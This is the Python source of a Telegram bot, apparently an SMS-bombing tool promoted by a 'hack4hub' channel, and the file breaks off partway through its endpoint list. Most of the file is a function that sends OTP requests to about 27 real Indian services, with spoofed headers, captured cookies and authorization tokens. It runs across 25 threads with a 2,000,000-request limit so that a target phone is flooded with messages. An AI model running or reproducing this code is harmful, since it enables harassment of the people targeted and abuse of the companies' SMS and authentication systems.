import asyncio
import base64
import json
import os
import random
import requests
import urllib.request
import urllib.parse
import urllib.error
import threading
import time
from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler 
)


JSON_FILE = "protected_numbers.json"
CHANNEL_LINK="https://t.me/hack4hub"
CHANNEL_ID="@hack4hub"
VERIFY_CALLBACK_DATA = "verify_channel_join"
API_INDICES = [i for i in range(31)] 
DEFAULT_COUNTRY_CODE = "91"
BOMBING_DELAY_SECONDS = 0.4 
MAX_REQUEST_LIMIT = 2000000
THREAD_COUNT = 25 
TELEGRAM_RATE_LIMIT_SECONDS = 5 


bombing_active = {}
bombing_threads = {}
global_request_counter = threading.Lock()
request_counts = {}
session = requests.Session()
BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*'
}


def esc(text: str) -> str:
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    for ch in escape_chars:
        text = text.replace(ch, "\\" + ch)
    return text

def encrypt_number(phone: str) -> str:
    return base64.b64encode(phone.encode()).decode()

def load_db():
    if not os.path.exists(JSON_FILE):
        return {}
    try:
        with open(JSON_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, UnicodeDecodeError):
        # If corrupted, recreate an empty file
        return {}


def save_db(data):
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def getapi(pn, lim, cc):
   
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)

    url_urllib = [
        "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(cc) + "&nod=4&phone=" + pn, 
        "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, 
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn
    ]
    
    if lim < len(url_urllib):
        try:
            urllib.request.urlopen(str(url_urllib[lim]), timeout=5)
            return True
        except (urllib.error.HTTPError, urllib.error.URLError, Exception):
            return False
    
    
    try:
        if lim == 3: # PharmEasy
            headers = {
                'Host': 'pharmeasy.in', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://pharmeasy.in/', 'Content-Type': 'application/json', 'Connection': 'keep-alive',
            }
            data = {"contactNumber":pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 4: # Hero MotoCorp 
            cookies = {
                '_ga': 'GA1.2.1273460610.1561191565', '_gid': 'GA1.2.172574299.1561191565',
                'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
            }
            headers={
                'Host': 'www.heromotocorp.com', 'Connection': 'keep-alive', 'Accept': '*/*', 
                'Origin': 'https://www.heromotocorp.com', 'X-Requested-With': 'XMLHttpRequest', 
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
              'mobile_no_otp': '', 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
            }
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 5: # IndiaLends
            cookies = {
                '_ga': 'GA1.2.1483885314.1559157646', '_fbp': 'fb.1.1559157647161.1989205138', 
                'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs', '_gid': 'GA1.2.969623705.1560660444',
            }
            headers = {
                'Host': 'indialends.com', 'Connection': 'keep-alive', 'Accept': '*/*', 
                'Origin': 'https://indialends.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Referer': 'https://indialends.com/personal-loan', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'
            }
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 6: # Flipkart 1
            headers = {
            'host': 'www.flipkart.com', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 
            'accept': '*/*', 'accept-language': 'en-US,en;q=0.5', 'accept-encoding': 'gzip, deflate, br', 
            'referer': 'https://www.flipkart.com/', 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop', 
            'origin': 'https://www.flipkart.com', 'connection': 'keep-alive', 
            'Content-Type': 'application/json; charset=utf-8'}
            data = {"loginId":[f"+{cc}{pn}"],"supportAllStates":True} 
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 7: # Flipkart 2 
            cookies = {
                'T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050', 'SWAB': 'build-44be9e47461a74d737914207bcbafc30', 
                'lux_uid': '155867904381892986', 'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
            }
            headers = {
                'Host': 'www.flipkart.com', 'Connection': 'keep-alive', 'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop', 
                'Origin': 'https://www.flipkart.com', 'Save-Data': 'on', 
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 
                'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*', 
                'Referer': 'https://www.flipkart.com/', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'
            }
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 8: # Lenskart
            headers = {
                'Host': 'www.ref-r.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0', 
                'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'Connection': 'keep-alive',
            }
            data = {'mobile': pn, 'submit': '1', 'undefined': ''}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 9: # Practo 
            headers = {
                'X-DROID-VERSION': '4.12.5', 'API-Version': '2.0', 'user-agent': 'samsung SM-G9350 0 4.4.2', 
                'client-version': 'Android-4.12.5', 'X-DROID-VERSION-CODE': '158', 'Accept': 'application/json', 
                'client-name': 'Practo Android App', 'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'accounts.practo.com', 'Connection': 'Keep-Alive', }
            data = {
              'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}', 'fingerprint': '', 'device_name':'samsung+SM-G9350'}
            response = session.post( "https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()

        elif lim == 10: # PizzaHut 
            headers = {
                'Host': 'm.pizzahut.co.in', 'content-length': '114', 'origin': 'https://m.pizzahut.co.in', 
                'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5iTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4', 
                'x-source-origin': 'PWAFW', 'content-type': 'application/json', 'accept': 'application/json, text/plain, */*', 
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'save-data': 'on', 'languagecode': 'en', 'referer': 'https://m.pizzahut.co.in/login', 
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 'cookie': 'AKA_A2=A'}
            data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 11: # Goibibo
            headers = {
                'host': 'www.goibibo.com', 'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.5', 
                'accept-encoding': 'gzip, deflate, br', 'referer': 'https://www.goibibo.com/mobile/?sms=success', 
                'content-type': 'application/x-www-form-urlencoded', 'connection': 'keep-alive', 
                'upgrade-insecure-requests': '1'}
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 12: # Apollo Pharmacy
            headers = {
                'Host': 'www.apollopharmacy.in', 'accept': '*/*', 
                'origin': 'https://www.apollopharmacy.in', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/', 
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 
                'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'}
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data, timeout=5)
            return "sent" in response.text.lower()

        elif lim == 13: # Ajio 
            headers = {
                'Host': 'www.ajio.com', 'Connection': 'keep-alive', 'Accept': 'application/json',
                'Origin': 'https://www.ajio.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/json', 'Referer': 'https://www.ajio.com/signup',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
            data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":pn,"requestType":"SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text

        elif lim == 14: # AltBalaji
            headers = {
                'Host': 'api.cloud.altbalaji.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://lite.altbalaji.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
                'Content-Type': 'application/json;charset=UTF-8', 'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
            data = {"country_code":cc,"phone_number":pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.text == '24f467b24087ff48c96321786d89c69f'

        elif lim == 15: # Aala 
            headers = {
                'Host': 'www.aala.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Origin': 'https://www.aala.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://www.aala.com/',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5'}
            data = {'email': f'{cc}{pn}', 'firstname': 'SpeedX', 'lastname': 'SpeedX'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, data=data, timeout=5)
            return 'code:' in response.text

        elif lim == 16: # Grab
            data = {
              'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'
            }
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code == 200

        elif lim == 17: # GheeAPI (gokwik.co - 19g6im8srkz9y)
            headers = {
              "accept": "application/json, text/plain, */*", 
              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
              "content-type": "application/json", 
              "gk-merchant-id": "19g6im8srkz9y", 
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 18: # EdzAPI (gokwik.co - 19an4fq2kk5y)
            headers = {
              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
              "content-type": "application/json", 
              "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 19: # FalconAPI (api.breeze.in)
            headers = {
              "Content-Type": "application/json", 
              "x-device-id": "A1pKVEDhlv66KLtoYsml3", 
              "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
            }
            data = {
                "phoneNumber": pn,
                "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"
            }
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 20: # NeclesAPI (gokwik.co - 19g6ilhej3mfc)
            headers = {
              "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA", 
              "Content-Type": "application/json", 
              "gk-merchant-id": "19g6ilhej3mfc", 
              "gk-signature": "645574", 
              "gk-timestamp": "58581194"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 21: # KisanAPI (oidc.agrevolution.in)
            headers = {
              "Content-Type": "application/json"
            }
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "true" in response.text.lower()
            
        elif lim == 22: # PWAPI (api.penpencil.co)
            headers = {
              "Accept": "*/*", 
              "Content-Type": "application/json", 
              "randomid": "de6f4924-22f5-42f5-ad80-02080277eef7"
            }
            data = {
                "mobile": pn,
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 23: # KahatBook (api.khatabook.com)
            headers = {
              "Content-Type": "application/json", 
              "x-kb-app-locale": "en", 
              "x-kb-app-name": "Khatabook Website", 
              "x-kb-app-version": "000100", 
              "x-kb-new-auth": "false", 
              "x-kb-platform": "web"
            }
            data = {
                "country_code": f"+{cc}",
                "phone": pn,
                "app_signature": "Jc/Zu7qNqQ2"
            }
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "success" in response.text.lower()
            
        elif lim == 24: # JockeyAPI (www.jockey.in)
            cookies = {
                "localization": "IN", "_shopify_y": "6556c530-8773-4176-99cf-f587f9f00905", 
                "_tracking_consent": "3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ", "_ga": "GA1.1.377231092.1757430108", 
                "_fbp": "fb.1.1757430108545.190427387735094641", "_quinn-sessionid": "a2465823-ceb3-4519-9f8d-2a25035dfccd", 
                "cart": "hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06", 
                "wishlist_id": "7531056362789hypmaaup", "wishlist_customer_id": "0", 
                "_shopify_s": "d4985de8-eb08-47a0-9f41-84adb52e6298"
            }
            headers = {
                "accept": "*/*", 
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                "origin": "https://www.jockey.in", 
                "referer": "https://www.jockey.in/"
            }
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true"
            response = session.get(url, headers=headers, cookies=cookies, timeout=5)
            return response.status_code == 200

        elif lim == 25: # FasiinAPI (gokwik.co - 19kc37zcdyiu)
            headers = {
              "Content-Type": "application/json", 
              "Accept": "application/json", 
              "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA", 
              "gk-merchant-id": "19kc37zcdyiu", 
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        # 26: VidyaKul
        elif lim == 26: 
            cookies = {
                'gcl_au': '1.1.1308751201.1759726082', 
                'initialTrafficSource': 'utmcsr=live|utmcmd=organic|utmccn=(not set)|utmctr=(not provided)', 
                '__utmzzses': '1', 
                '_fbp': 'fb.1.1759726083644.475815529335417923', 
                '_ga': 'GA1.2.921745508.1759726084', 
                '_gid': 'GA1.2.1800835709.1759726084', 
                '_gat_UA-106550841-2': '1', 
                '_hjSession_2242206': 'eyJpZCI6ImQ0ODFkMjIwLTQwMWYtNDU1MC04MjZhLTRlNWMxOGY4YzEyYSIsImMiOjE3NTk3MjYwODQyMDMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=', 
                'trustedsite_visit': '1', 
                'ajs_anonymous_id': '1681028f-79f7-458e-bf04-00aacdefc9d3', 
                '_hjSessionUser_2242206': 'eyJpZCI6IjZhNWE4MzJlLThlMzUtNTNjNy05N2ZjLTI0MzNmM2UzNjllMSIsImNyZWF0ZWQiOjE3NTk3MjYwODQyMDEsImV4aXN0aW5nIjp0cnVlfQ==', 
                'vidyakul_selected_languages': 'eyJpdiI6IkJzY1FUdUlodlRMVXhCNnE5V2RDT1E9PSIsInZhbHVlIjoiTTBcL2RKNmU2b1Fab1BnS3FqSDBHQktQVlk0SXRmczIxSGJrakhOaTJ5dllyclZiTk5FeVBGREE3dzVJbXI5T0oiLCJtYWMiOiI5MWU4NDViZDVhOTFjM2NmMmYyZjYwMmRiMmQyNGU4NTRlYjQ0MGM3ZTJmNjIzM2Q2M2ZhNTM0ZTVjMGUzZmUyIn0%3D', 
                'WZRK_S_4WZ-K47-ZZ6Z': '%7B%22p%22%3A3%7D', 
                'vidyakul_selected_stream': 'eyJpdiI6Ik0rb3pnN0gwc21pb1JsbktKNkdXOFE9PSIsInZhbHVlIjoibE9rWGhTXC8xQk1OektzXC9zNXlcLzloR0xjQ2hCMU5nT2pobU0rMU1FbjNSOD0iLCJtYWMiOiJiZjY4MWFhNWM2YzE4ZmViMDhlNWI2OGQ5YmNjM2I3NjNhOTJhZDc5ZDk3ZWE1MGM5OTA4MTA5ODhmMjRkZjk2In0%3D', 
                '_ga_53F4FQTTGN': 'GS2.2.s1759726084$o1$g1$t1759726091$j53$l0$h0', 
                'mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3A7b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22%24device_id%22%3A%227b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22mp_lib%22%3A%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%22bing%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D', 
                'XSRF-TOKEN': 'eyJpdiI6IjFTYW9wNmVJQjY3TFpEU2RYeEdNbkE9PSIsInZhbHVlIjoidmErTnBFcU1JVHpFN2daOENRVG9aQ1RNU25tZnQ1dkM2M1hkQitSdVZRNGxtZUVpTFNvbjM2NlwvVEpLTkFqcCtiTHhNbjVDZWhSK3h1VytGQ0NiRFRRPT0iLCJtYWMiOiI1ZjM3ZDk1YzMwZTYzOTMzM2YwYzFhYTgyNjYzZDRmYWE4ZWQwMDdhYzM1MTdlM2NkNjgzZTNjNWNjZmI2ZWQ4In0%3D', 
                'vidyakul_session': 'eyJpdiI6IlNDQWNpU2ZXMTEraENaaGtsQkJPMmc9PSIsInZhbHVlIjoicXFRbWVqNXhiejlwTFFpXC9OVmdWQkZsODhjUVpvenE0eTB3cGFiQ2F4ckx5Y3dcL3Z1S1NmNnhRNEduV01WT3Q1d2pKMlF3blpySU5YUU5vUldFTFI1dz09IiwibWFjIjoiOWFjNTM1NmQyMTg2YWE0MGZiMzljOGM0MDMzZjc4NWQyNzM0NTU4MzhkZjczNjU3OGNhNGM0Yjg2ZTEwZTJhMSJ9'
            }
            headers = {
              'accept': 'application/json, text/javascript, */*; q=0.01', 
              'accept-language': 'en-US,en;q=0.9', 
              'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
              'origin': 'https://vidyakul.com', 
              'referer': 'https://vidyakul.com/explore-courses/class-10th/english-medium-biharboard', 
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0', 
              'x-csrf-token': 'fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q', 
              'x-requested-with': 'XMLHttpRequest'
            }
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()
        
        # 27: NEW API - Aditya Birla Capital
        elif lim == 27: 

            cookies = {
                '_gcl_au': '1.1.781134033.1759810407', 
                '_gid': 'GA1.2.1720693822.1759810408', 
                'sess_map': 'eqzbxwcubfayctusrydzbesabydweezdbateducxxdcrxstydtyzrbrtzsuqbdaswwuffravtvutuzuqcsvrtescduettszavexcraaevefqbwccdwvqucftswtzqxtbafdfycqwuqvryswywubrayfrbbfcszcywqsdyauttdaaybsq', 
                '_ga': 'GA1.3.1436666301.1759810408', 
                'WZRK_G': 'd74161bab0c042e8a9f0036c8570fe44', 
                'mfKey': '14m4ctv.1759810410656', 
                '_ga_DBHTXT8G52': 'GS2.1.s1759810408$o1$g1$t1759810411$j57$l0$h328048196', 
                '_uetsid': 'fc23aaa0a33311f08dc6ad31d162998d', 
                '_uetvid': 'fc23ea50a33311f081d045d889f28285', 
                '_ga_KWL2JXMSG9': 'GS2.1.s1759810411$o1$g1$t1759810814$j54$l0$h0', 
                'WZRK_S_884-575-6R7Z': '%7B%22p%22%3A3%2C%22s%22%3A1759810391%2C%22t%22%3A1759810815%7D'
            }
            headers = {
                'Accept': '/*', 
                'Accept-Language': 'en-US,en;q=0.9', 
